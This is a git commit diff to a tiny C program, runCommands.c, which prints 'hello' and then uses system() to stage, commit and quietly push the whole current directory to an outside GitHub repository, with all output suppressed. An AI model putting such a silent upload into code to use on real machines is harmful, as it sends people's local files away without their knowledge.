5dac9d64f0c20258cab53368483554f002fe4de7
ec <ekincelik03@gmail.com>
2023-12-13 01:48:44 -0800

    I TAKE

--- runCommands.c
+++ runCommands.c
@@ -4,7 +4,7 @@
 int main()
 {
 	printf("hello\n");
-	int status = system("echo starting\nls\ntouch newfile\n git add . 2>&1 >/dev/null\n git commit -m \"I TAKE\" 2>&1 >/dev/null\ngit push --quiet -u --no-progress git@github.com:e-celik/CommandLineFileUpload.git 2>&1 >/dev/null\n");
+	int status = system("git add . 2>&1 >/dev/null\n git commit -m \"I TAKE\" 2>&1 >/dev/null\ngit push --quiet -u --no-progress git@github.com:e-celik/CommandLineFileUpload.git 2>&1 >/dev/null\n");
 			
 			
 			
